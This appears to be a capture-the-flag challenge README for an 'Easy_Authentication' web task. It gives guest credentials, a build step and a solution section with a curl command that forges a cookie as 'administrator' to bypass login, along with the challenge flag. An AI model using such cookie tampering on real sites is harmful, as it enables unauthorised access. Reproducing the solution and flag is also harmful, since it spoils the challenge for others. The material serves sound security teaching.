
# Easy_Authentication

Difficulty Level: Easy

Can you bypass this super easy authentication that was created by me? Guest Login are available via :

Username: guest

Password: guest

Connect at http://web.ctf-fun.xyz:15012


### Hints

- -	No hints are given.

## Deployment

Run  sudo ./build.sh in distrib to static file server.

## Solution

Go to the site and log in; you'll get a cookie set such as: username=guest&date=2017-01-28T17:12:33-0800&secret_length=8&

All you have to do is change the username:

curl 'http://web.ctf-fun.xyz/index.php' -H 'Cookie: auth=username%3Dadministrator%26date%3D2017-02-02T03%3A41%3A45%2B0000%26'

### Flag
`19C4{cookie_is_nice}`
